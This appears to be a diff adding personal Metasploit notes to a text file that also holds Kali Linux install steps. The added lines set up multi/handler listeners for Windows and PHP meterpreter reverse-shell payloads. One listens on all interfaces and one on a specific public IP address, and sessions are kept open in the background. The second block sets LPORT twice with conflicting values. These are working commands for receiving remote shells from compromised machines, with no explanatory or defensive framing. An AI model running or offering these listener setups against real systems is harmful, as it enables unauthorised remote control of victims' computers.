@@ -1,3 +1,25 @@
+MSF 
+cd metasploit-framework
+./msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LPORT 443
+set LHOST 0.0.0.0
+set ExitOnSession false
+exploit -j
+
+cd metasploit-framework
+./msfconsole
+use multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LPORT 443
+set LHOST 159.203.14.45
+set LPORT 4444
+set exitonsession false
+exploit -j
+
+
+
 #INITIAL KALI INSTALL
 nano /etc/apt/sources.list
 deb http://http.kali.org/kali kali-rolling main contrib non-free
